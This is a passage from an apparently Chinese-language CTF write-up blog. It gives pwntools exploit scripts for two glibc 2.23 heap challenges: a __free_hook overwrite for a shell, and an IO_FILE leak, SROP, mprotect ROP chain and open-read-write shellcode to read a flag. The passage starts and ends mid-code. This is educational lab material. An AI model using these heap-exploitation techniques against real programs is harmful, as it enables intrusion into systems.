class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      PIE enabled</span></span><br><span class="line"><span class="comment"># RUNPATH:  '/usr/lib/glibc/2.23-0ubuntu10_amd64/'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">c</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sla(<span class="string">"Your Choice&gt;&gt; \n"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    c(<span class="number">1</span>)</span><br><span class="line">    c(idx)</span><br><span class="line">    sa(<span class="string">"Please input car's name: \n"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    c(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    c(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">"Please input car's index: "</span>, str(idx))</span><br><span class="line">    sa(<span class="string">"Please input name: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    c(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">"Please input car's index: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">down</span><span class="params">(idx)</span>:</span></span><br><span class="line">    c(<span class="number">5</span>)</span><br><span class="line">    sla(<span class="string">":"</span>, str(idx))</span><br><span class="line">    sla(<span class="string">"&gt;&gt;"</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">up1</span><span class="params">(idx)</span>:</span></span><br><span class="line">    c(<span class="number">5</span>)</span><br><span class="line">    sla(<span class="string">":"</span>, str(idx))</span><br><span class="line">    sla(<span class="string">"&gt;&gt;"</span>, <span class="string">"1"</span>)</span><br><span class="line">    sla(<span class="string">"&gt;&gt;"</span>, <span class="string">"1"</span>)</span><br><span class="line">    ru(<span class="string">"Car's Speed is "</span>)</span><br><span class="line">    <span class="keyword">return</span> int(ru(<span class="string">"Km/h"</span>), <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">up2</span><span class="params">(idx)</span>:</span></span><br><span class="line">    c(<span class="number">5</span>)</span><br><span class="line">    sla(<span class="string">":"</span>, str(idx))</span><br><span class="line">    sla(<span class="string">"&gt;&gt;"</span>, <span class="string">"1"</span>)</span><br><span class="line">    sla(<span class="string">"&gt;&gt;"</span>, <span class="string">"2"</span>)</span><br><span class="line">    ru(<span class="string">"Car's Speed is "</span>)</span><br><span class="line">    <span class="keyword">return</span> int(ru(<span class="string">"Km/h"</span>), <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getlicense</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    c(<span class="number">6</span>)</span><br><span class="line">    sla(<span class="string">":"</span>, str(idx))</span><br><span class="line">    sla(<span class="string">":"</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    c(<span class="number">8</span>)</span><br><span class="line">    ru(<span class="string">"gift: "</span>)</span><br><span class="line">    heap_base = int(r(<span class="number">14</span>), <span class="number">16</span>)</span><br><span class="line">    heap_base = (heap_base &gt;&gt; <span class="number">12</span>) &lt;&lt; <span class="number">12</span></span><br><span class="line">    new(<span class="number">3</span>, <span class="string">"3"</span>*<span class="number">0x4</span>)</span><br><span class="line">    new(<span class="number">2</span>, <span class="string">"2"</span>*<span class="number">0x4</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    new(<span class="number">2</span>, <span class="string">"2"</span>*<span class="number">0x4</span>) <span class="comment">#0</span></span><br><span class="line">    new(<span class="number">2</span>, <span class="string">"2"</span>*<span class="number">0x4</span>) <span class="comment">#1</span></span><br><span class="line">    payload = flat([</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0xf0</span>,</span><br><span class="line">        heap_base+<span class="number">0x58</span><span class="number">-0x18</span>,</span><br><span class="line">        heap_base+<span class="number">0x58</span><span class="number">-0x10</span>,</span><br><span class="line">        p64(<span class="number">0</span>)*<span class="number">3</span>,</span><br><span class="line">        <span class="number">0x1234</span></span><br><span class="line">    ])</span><br><span class="line">    payload = payload.ljust(<span class="number">0xf0</span>)</span><br><span class="line">    payload += p64(<span class="number">0xf0</span>)</span><br><span class="line">    edit(<span class="number">0</span>, payload)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">48</span>):</span><br><span class="line">        down(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        up1(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        up2(<span class="number">0</span>)</span><br><span class="line">    up1(<span class="number">0</span>)</span><br><span class="line">    payload = flat([</span><br><span class="line">        p64(<span class="number">0</span>)*<span class="number">7</span>,</span><br><span class="line">        <span class="number">0x1234</span>,</span><br><span class="line">    ])</span><br><span class="line">    payload = payload.ljust(<span class="number">0x220</span>, <span class="string">'\x00'</span>)</span><br><span class="line">    new(<span class="number">3</span>, payload)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    payload = flat([</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0x68</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        heap_base+<span class="number">0x2b0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0x101</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0x221</span></span><br><span class="line">    ])</span><br><span class="line">    new(<span class="number">1</span>, payload) <span class="comment">#0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">48</span>):</span><br><span class="line">        down(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        up1(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        up2(<span class="number">1</span>)</span><br><span class="line">    up1(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    payload = flat([</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0x220</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        heap_base + <span class="number">0x270</span>,</span><br><span class="line">        <span class="number">0x220</span></span><br><span class="line">    ])</span><br><span class="line">    new(<span class="number">1</span>, payload)</span><br><span class="line">    show()</span><br><span class="line">    ru(<span class="string">"Car 1's name: "</span>)</span><br><span class="line">    main_arena = uu64(r(<span class="number">6</span>))<span class="number">-88</span></span><br><span class="line">    libc.address = main_arena - <span class="number">0x10</span> - libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">    __free_hook = libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">    system = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    payload = flat([</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0x220</span>,</span><br><span class="line">        heap_base + <span class="number">0x2e0</span>,</span><br><span class="line">        <span class="number">0x220</span></span><br><span class="line">    ])</span><br><span class="line">    new(<span class="number">1</span>, payload)</span><br><span class="line">    new(<span class="number">3</span>, <span class="string">"aaa\n"</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    payload = flat([</span><br><span class="line">        p64(<span class="number">0</span>)*<span class="number">2</span>,</span><br><span class="line">        <span class="number">0x220</span>,</span><br><span class="line">        heap_base + <span class="number">0x2e0</span>,</span><br><span class="line">        <span class="number">0x220</span>,</span><br><span class="line">        <span class="number">0x231</span>,</span><br><span class="line">        main_arena+<span class="number">88</span>,</span><br><span class="line">        heap_base</span><br><span class="line">    ])</span><br><span class="line">    new(<span class="number">1</span>, payload)</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    new(<span class="number">3</span>, p64(<span class="number">0</span>))</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    payload = flat([</span><br><span class="line">        <span class="string">"/bin/sh\x00"</span>*<span class="number">2</span>,</span><br><span class="line">        p64(<span class="number">0x220</span>),</span><br><span class="line">        p64(__free_hook),</span><br><span class="line">        p32(<span class="number">0</span>),</span><br><span class="line">        <span class="string">'\n'</span></span><br><span class="line">    ])</span><br><span class="line">    new(<span class="number">1</span>, payload)</span><br><span class="line">    getlicense(<span class="number">1</span>, p64(system))</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    lg(<span class="string">"main_arena"</span>, main_arena)</span><br><span class="line">    lg(<span class="string">"heap_base"</span>, heap_base)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><h2 id="orwpwn"><a href="#orwpwn" class="headerlink" title="orwpwn"></a>orwpwn</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[+]      libc.addressess--&gt;0x7f4fabd43000</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">flag&#123;123456&#125;</span><br></pre></td></tr></table></figure><p>先放上成功结果</p><h3 id="新点"><a href="#新点" class="headerlink" title="新点"></a>新点</h3><h4 id="mprotect改内存页权限"><a href="#mprotect改内存页权限" class="headerlink" title="mprotect改内存页权限"></a>mprotect改内存页权限</h4><p>以前不知道这个姿势，知道后感觉挺骚的，挺强的一个方法<br>mprotect传入参数后，能让指定内存页变成可执行，所以利用方式</p><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JvbGFuZF9TdW4vYXJ0aWNsZS9kZXRhaWxzLzMzNzI4OTU1" title="https://blog.csdn.net/Roland_Sun/article/details/33728955">mprotect改内存页权限<i class="fa fa-external-link"></i></span></p><ol><li>知道一个内存页的地址</li><li>这个内存页内容可控</li></ol><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLnJjaGFwbWFuLm9yZy9wb3N0cy9MaW51eF9TeXN0ZW1fQ2FsbF9UYWJsZV9mb3JfeDg2XzY0Lw==" title="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">x64系统调用表<i class="fa fa-external-link"></i></span></p><h4 id="shellcode编写"><a href="#shellcode编写" class="headerlink" title="shellcode编写"></a>shellcode编写</h4><p>这个我以前也很怕的，这次自己写了下好像也就那样嘛，不会很复杂的，通常来说，你只要自己调试下就行了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    shellcode = shellcraft.amd64.open(<span class="string">'flag'</span>)</span><br><span class="line">    shellcode += <span class="string">'''</span></span><br><span class="line"><span class="string">    mov edi, eax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov edx, 0x100</span></span><br><span class="line"><span class="string">    xor eax, eax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov edi, 1</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    print(shellcode)</span><br><span class="line">    print(asm(shellcode, arch=<span class="string">'amd64'</span>))</span><br></pre></td></tr></table></figure><p>可以通过context设置平台，context.arch=’amd64’<br>我这里没设置，所以就用每次加个amd64</p><p>打开flag文件部分，大概就是</p><ol><li>设置rax=2</li><li>rdi = filename</li><li>rsi = 0 #标志只读方式</li><li>rdx = 0 # mode其实可以不填，所以，不用设置也可以</li><li>rax=2 # 系统中断号</li><li>调用syscall</li></ol><p>后面几个流程差不多，看下中断表就行</p><p>自己写的话</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">push 0x67616c66</span><br><span class="line">mov rdi,rsp</span><br><span class="line">xor esi,esi</span><br><span class="line">push 2</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>然后我为了省事，直接用shellcraft.amd64.open(‘flag’)生成了</p><p>接下来读取函数，因为返回了fd，存在rax里，所以第一步要保存rax值到rdi里</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov rdi,rax</span><br><span class="line">mov rsi,rsp</span><br><span class="line">xor eax,eax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>在接下来写函数</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov edi,1</span><br><span class="line">mov rsi,rsp</span><br><span class="line">push 1</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p><img src="https://github.com/NoOne-hub/picture/blob/master/orw-2.png" alt="系统调用表"></p><p>最后推荐篇文章<br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjY0NQ==" title="https://xz.aliyun.com/t/6645">shellcode编写<i class="fa fa-external-link"></i></span></p><p>感觉总结得挺好的</p><h4 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h4><p>这部分可以去看下ctf-wiki吧</p><p><span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5naXRodWIuaW8vY3RmLXdpa2kvcHduL2xpbnV4L3N0YWNrb3ZlcmZsb3cvYWR2YW5jZWQtcm9wLXpoLyNzcm9w" title="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#srop">SROP攻击<i class="fa fa-external-link"></i></span></p><h3 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><h4 id="准备部分"><a href="#准备部分" class="headerlink" title="准备部分"></a>准备部分</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sla(<span class="string">"Your Choice: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">"Please input size: "</span>, str(size))</span><br><span class="line">    <span class="keyword">if</span> len(content) == (size+<span class="number">1</span>):</span><br><span class="line">        sa(<span class="string">"Please input content: "</span>, content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sla(<span class="string">"Please input content: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">"Please input idx: "</span>, str(idx))</span><br><span class="line">    sa(<span class="string">"Please input content: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">"Please input idx: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    choice(<span class="number">4</span>)</span><br></pre></td></tr></table></figure><h4 id="IO-file攻击"><a href="#IO-file攻击" class="headerlink" title="IO_file攻击"></a>IO_file攻击</h4><p>这部分就是通过溢出，修改size,然后free掉一个fake的，最后通过IO_file攻击泄露地址，<br>这部分我是拿的ex师傅的部分的，我自己也写了个这部分的，利用chunk extends，搞复杂了，那会，感觉这个简洁些</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">new(<span class="number">0x68</span>, <span class="string">'1'</span>) <span class="comment">#0</span></span><br><span class="line">new(<span class="number">0x78</span>, <span class="string">'2'</span>) <span class="comment">#1</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">new(<span class="number">0x68</span>, payload*<span class="number">6</span>) <span class="comment">#2</span></span><br><span class="line">new(<span class="number">0x68</span>, payload*<span class="number">6</span>) <span class="comment">#3</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">new(<span class="number">0x68</span>, <span class="string">'a'</span>*<span class="number">0x60</span> + p64(<span class="number">0</span>) + p8(<span class="number">0xf1</span>)) <span class="comment">#0</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">new(<span class="number">0x78</span>, <span class="string">'1'</span>) <span class="comment">#1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">new(<span class="number">0x68</span>, <span class="string">'a'</span>*<span class="number">0x60</span> + p64(<span class="number">0</span>) + p8(<span class="number">0xa1</span>)) <span class="comment">#0</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">new(<span class="number">0x98</span>, <span class="string">'1'</span>) <span class="comment">#1</span></span><br><span class="line">edit(<span class="number">1</span>, <span class="string">'b'</span>*<span class="number">0x70</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p16(<span class="number">0x8620</span><span class="number">-0x40</span><span class="number">-0x3</span>))</span><br><span class="line">new(<span class="number">0x68</span>, <span class="string">'\n'</span>) <span class="comment">#2</span></span><br><span class="line">new(<span class="number">0x68</span>, <span class="string">'\x00'</span>*<span class="number">0x33</span> + p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> ) <span class="comment">#3</span></span><br><span class="line">r(<span class="number">0x88</span>)</span><br><span class="line">libc.address = uu64(r(<span class="number">8</span>)) - libc.symbols[<span class="string">'_IO_2_1_stdin_'</span>]</span><br><span class="line">lg(<span class="string">"libc.addressess"</span>, libc.address)</span><br></pre></td></tr></table></figure><h4 id="unsortedbin攻击"><a href="#unsortedbin攻击" class="headerlink" title="unsortedbin攻击"></a>unsortedbin攻击</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">edit(<span class="number">1</span>, <span class="string">'b'</span>*<span class="number">0x70</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">'b'</span>*<span class="number">0x70</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + p64(<span class="number">0</span>) + p64(libc.symbols[<span class="string">'__free_hook'</span>]<span class="number">-0x20</span>))</span><br><span class="line">new(<span class="number">0x88</span>, <span class="string">'2'</span>) <span class="comment">#2</span></span><br></pre></td></tr></table></figure><h4 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin attack"></a>fastbin attack</h4><p>这里有个点点一下，就是srop部分，因为setcontext最后一句xor eax,eax，再加上syscall就是相当于调用read,<br>rdi 第一个参数 fd<br>rsi 第二个参数 buf<br>rdx 第三个参数 count 大小<br>rsp 执行完后的rsp<br>rip 就是 执行syscall加ret</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">edit(<span class="number">1</span>, <span class="string">'b'</span>*<span class="number">0x70</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">'b'</span>*<span class="number">0x70</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(libc.symbols[<span class="string">'__free_hook'</span>]<span class="number">-0x13</span>))</span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rdi = <span class="number">0</span> <span class="comment"># fd为0</span></span><br><span class="line">frame.rsi = (libc.symbols[<span class="string">'__free_hook'</span>]) &amp; <span class="number">0xfffffffffffff000</span> <span class="comment">#</span></span><br><span class="line">frame.rdx = <span class="number">0x2000</span></span><br><span class="line">frame.rsp = (libc.symbols[<span class="string">'__free_hook'</span>]) &amp; <span class="number">0xfffffffffffff000</span></span><br><span class="line">frame.rip = libc.address + <span class="number">0x00000000000bc375</span> <span class="comment">#: syscall; ret; </span></span><br><span class="line">payload = str(frame)</span><br><span class="line">new(<span class="number">0x68</span>, payload[<span class="number">0x80</span>:<span class="number">0x80</span>+<span class="number">0x60</span>])</span><br><span class="line">new(<span class="number">0x68</span>, <span class="string">'\x00'</span>*<span class="number">3</span> + p64(libc.symbols[<span class="string">'setcontext'</span>]+<span class="number">53</span>))</span><br><span class="line">edit(<span class="number">1</span>, payload[:<span class="number">0x98</span>])</span><br></pre></td></tr></table></figure><h4 id="mprotect修改内存页权限"><a href="#mprotect修改内存页权限" class="headerlink" title="mprotect修改内存页权限"></a>mprotect修改内存页权限</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"> layout = [</span><br><span class="line">     libc.address + <span class="number">0x0000000000021102</span>, <span class="comment">#: pop rdi; ret; </span></span><br><span class="line">     libc.symbols[<span class="string">'__free_hook'</span>] &amp; <span class="number">0xfffffffffffff000</span>, <span class="comment"># 开始地址</span></span><br><span class="line">     libc.address + <span class="number">0x00000000000202e8</span>, <span class="comment">#: pop rsi; ret; </span></span><br><span class="line">     <span class="number">0x2000</span>, <span class="comment"># 空间大小</span></span><br><span class="line">     libc.address + <span class="number">0x0000000000001b92</span>, <span class="comment">#: pop rdx; ret;  </span></span><br><span class="line">     <span class="number">7</span>, <span class="comment"># rwx可读可写可执行</span></span><br><span class="line">     libc.address + <span class="number">0x0000000000033544</span>, <span class="comment">#: pop rax; ret; </span></span><br><span class="line">     <span class="number">10</span>, <span class="comment">#mprotect调用号</span></span><br><span class="line">     libc.address + <span class="number">0x00000000000bc375</span>, <span class="comment">#: syscall; ret;</span></span><br><span class="line">     libc.address + <span class="number">0x0000000000002a71</span>, <span class="comment">#: jmp rsp; </span></span><br><span class="line"> ]</span><br></pre></td></tr></table></figure><h4 id="shellcode-jmp-rsp"><a href="#shellcode-jmp-rsp" class="headerlink" title="shellcode jmp rsp"></a>shellcode jmp rsp</h4><p>第一份shellcode ex师傅的<br>第二份用pwntools加自己编写一些<br>第三份纯自己写一遍</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">    shellcode = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">    push 0x67616c66</span></span><br><span class="line"><span class="string">    mov rdi, rsp</span></span><br><span class="line"><span class="string">    xor esi, esi</span></span><br><span class="line"><span class="string">    mov eax, 2</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov edi, eax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov edx, 0x100</span></span><br><span class="line"><span class="string">    xor eax, eax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov edx, eax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov edi, 1</span></span><br><span class="line"><span class="string">    mov eax, edi</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    '''</span>)</span><br><span class="line">    shellcode = shellcraft.amd64.open(<span class="string">'flag'</span>)</span><br><span class="line">    shellcode += <span class="string">'''</span></span><br><span class="line"><span class="string">    mov edi, eax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov edx, 0x100</span></span><br><span class="line"><span class="string">    xor eax, eax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov edi, 1</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"></span><br><span class="line">    shellcode = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">    push 0x67616c66</span></span><br><span class="line"><span class="string">mov rdi,rsp</span></span><br><span class="line"><span class="string">xor esi,esi</span></span><br><span class="line"><span class="string">push 2</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rdi,rax</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov edx,0x100</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov edi,1</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">    '''</span>)</span><br></pre></td></tr></table></figure><h4 id="getshell走起"><a href="#getshell走起" class="headerlink" title="getshell走起"></a>getshell走起</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s(flat(layout) + shellcode)</span><br></pre></td></tr></table></figure><p>。。。好像不能啊,只能特么的读flag，没意思</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">host = <span class="string">'192.168.150.135'</span> </span><br><span class="line">port = <span class="number">10001</span></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">exe = <span class="string">'/tmp/tmp.97OiO1SVl1/pwn'</span></span><br><span class="line">context.binary = exe</span><br><span class="line">elf = ELF(exe)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(exe)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"></span><br><span class="line">s    = <span class="keyword">lambda</span> data            : io.send(str(data))</span><br><span class="line">sa   = <span class="keyword">lambda</span> delim,data      : io.sendafter(str(delim), str(data))</span><br><span class="line">sl   = <span class="keyword">lambda</span> data            : io.sendline(str(data))</span><br><span class="line">sla  = <span class="keyword">lambda</span> delim,data      : io.sendlineafter(str(delim), str(data))</span><br><span class="line">r    = <span class="keyword">lambda</span> numb=<span class="number">4096</span>       : io.recv(numb)</span><br><span class="line">ru   = <span class="keyword">lambda</span> delim,drop=<span class="literal">True</span> : io.recvuntil(delim, drop)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data            : u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data            : u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">lg   = <span class="keyword">lambda</span> s,addr          : io.success(<span class="string">'\033[1;31;40m%20s--&gt;0x%x\033[0m'</span>%(s,addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># break on aim addr</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(io.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(io,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(io,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Full RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      PIE enabled</span></span><br><span class="line"><span class="comment"># RUNPATH:  '/usr/lib/glibc/2.23-0ubuntu10_amd64/'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sla(<span class="string">"Your Choice: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">"Please input size: 